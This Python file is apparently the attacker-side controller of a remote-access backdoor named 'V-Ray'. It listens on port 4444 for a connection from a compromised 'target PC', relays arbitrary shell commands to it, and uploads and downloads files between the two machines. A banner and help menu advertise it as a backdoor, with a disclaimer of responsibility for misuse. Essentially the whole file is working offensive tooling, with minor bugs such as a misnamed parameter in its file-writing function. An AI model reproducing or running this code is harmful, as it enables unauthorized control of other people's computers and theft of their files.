import socket
import base64 as code
import subprocess as sub


def list_to_str(list):
    new_str = ""
    for element in list:
        new_str = new_str + element + ' '
    return new_str

class Connection:
    def __init__(self):
        self.history = []
        self.listen = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.listen.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)

    def start(self):
        print("[!] Waiting for any connection...")
        self.listen.bind(("192.168.1.10", 4444))
        self.listen.listen(0)
        self.connection, address = self.listen.accept()
        print("\033[0;32m[+] Accepted")
        print("""
        
        
                       //▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\\\\
                      //_______________________________\\\\
                     //                                 \\\\
                    |$#|                              ◄|#$|
                    |$#|►       \\\\-          -//      ◄|#$|
                    |$#|►        \\\\-        -//       ◄|#$|
                    |$#|►         \\\\-      -//        ◄|#$|
                    |$#|►          \\\\-    -//         ◄|#$|
                    |$#|►           \\\\-  -//          ◄|#$|
                    |$#|►            \\\\--//           ◄|#$|
                    |$#|►             \\\\//            ◄|#$|
                    |$#|►              \/             ◄|#$|
                    |$#|                              ◄|#$|
                     \\\\|▬▬|▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬|▬▬|//
                      \\\\|▬▬|▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬|▬▬|//

                    

                      [The tool's name      : V-Ray]
                      [Created by           : Hack0X1999]
                      [Country              : Egypt]
                      \033[0;35m[Gethub     : https://github.com/Abdelrahman)
                      (-Security159/Penetrating/issues]
                      \033[0;33m[License    : Free_with_good_using]
                      \033[0;31m[!] Worning! I'm not responsible about any)
                      (bad using of this backdoor]\033[0m
        """)
    def send(self, data):
        self.connection.send(data.encode("UTF-8"))

    def send_noUTF(self, data):
        self.connection.send(data)

    def recv(self):
        data = ""
        buffer = 1024
        while True:
            part = self.connection.recv(buffer).decode("UTF-8")
            self.length = len(part)
            data += part
            if len(part) < buffer:
                break
            print(data)
        return data

    def recv_download(self):
        return self.connection.recv(1024).decode("UTF-8")

    def close(self):
        self.connection.close()

    def read(self, path):
        with open(path, "rb") as file:
            return code.b64encode(file.read())

    def write(self, path, date):
        with open(path, "wb") as file:
            file.write(code.b64decode(data))
            sub.call("mv " + path + " ~/Desktop/PythonProjects/backdoor/downloaded_files/", shell=True)



#<<<<<<<<<<<<<<<<<<<<<<<< Running >>>>>>>>>>>>>>>>>>>>>>>>>>#

hack = Connection()
hack.start()
while True:
    try:
        command = input("DedSec/~>> ").split(' ')
        hack.history.append(list_to_str(command))
        if command[0] == "exit":
            hack.send(list_to_str(command))
            hack.close()
            exit()
        elif command[0] == "help":
            print("""
            +==============================================================+
            +                Welcome in V-ray backdoor v1.0 .              +
            +==============================================================+

            All you need here is write the commands and
            -it must be run on target PC.

            here some of owr features:
            1- write most windows commands.
            2- 'history'           => get all your command which been written.
            3- 'upload file.ext'   => upload file.extention on target PC. <New>
            4- 'download file.ext' => download file.extention from target's PC. <New>
	           4.1- create 'download_files' directory to forware download in.
	           4.2- change your directory as you like from => def write(self, path, data): <=	
            5- 'help'              => to get this message.
            6- 'exit'              => terminate the program.
            7- add colors with commands.
            8- fix some of 'Beta' bugs :-
                    8.1- Downloading bug which like download large file get 
                    - Exception in buffer pipe data transefaring. <New>
                    8.2- Fix bugs with files 'upload & download'
            
            For any reporting : Our links above.
            """)
            continue
        elif command[0] == "cd" and len(command) > 1:
            hack.send(list_to_str(command))
        elif command[0] == "history":
            counter = 1
            for element in hack.history:
                print(f"\033[0;33m{counter} : \033[0;32m{element}\033[0;37m")
                counter += 1
            continue
        elif command[0] == "upload":
            count = 0
            try:
                data = hack.read(command[1])
            except Exception:
                print("\033[0;31m[-] File not found.\033[0;37m")
                continue
            while True:
                if count == 0:
                    hack.send(list_to_str(command))
                    count += 1
                ack = hack.recv()
                if ack == "OK":
                    print("\033[0;32m[+] Acknoledgment of Command was receved.\033[0;37m")
                    hack.send_noUTF(data)
                    ack = hack.recv()
                    if ack == "OK":
                        print("\033[0;32m[+] Acknoledgment of Data was receved.\033[0;37m")
                        hack.send(str(len(data)) + " ")
                        print("\033[0;33mLength : " + str(len(data)) + "\033[0;37m")
                        ack = hack.recv()
                        if ack == "NO":
                            print("NO")
                            continue
                        else:
                            print(ack)
                            break  # Don't forget the comments
            continue
        elif command[0] == "download":
            hack.send(list_to_str(command))
            ack = hack.recv()
            if ack == "OK":
                print("\033[0;32m[+] Accepted.\033[0;37m")
                hack.send(command[1] + " ")
                ack = hack.recv()
                if ack == "OK":
                    print("\033[0;32m[+] Got path.\033[0;37m")
                    hack.send("length ")
                    length = hack.recv()
                    if length == "No":
                        print("\033[0;31m[-] File not found.\033[0;37m")
                        continue
                    print("\033[0;33m[!] Length is       : " + str(length) + "\033[0;37m")
                    hack.send("data ")
                    data = ""
                    while True:
                        part = hack.recv_download()
                        if len(part) < 1024:
                            data += part
                            hack.write(command[1], data)
                            break
                        else:
                            data += part
                            hack.send("OK ")
            continue
        else:
            data_to_send = list_to_str(command)
            hack.send(data_to_send)

        data = hack.recv()
        if data == "chdir":
            print("\033[0;32m[+] Changed Successfully.\033[0;37m")
        elif data == "Done":
            print("\033[0;32m[+] Removed Successfully.\033[0;37m")
        elif data == "No":
            print("\033[0;31m[-] File not found.\033[0;37m")
        else:
            print("\033[0;33m" + data + "\033[0;37m")

    #except Exception:
    #    print("[-] Error was found.")
    except KeyboardInterrupt:
        print("\n\033[0;31m[-] Program was interrubted.\033[0;37m")
        break
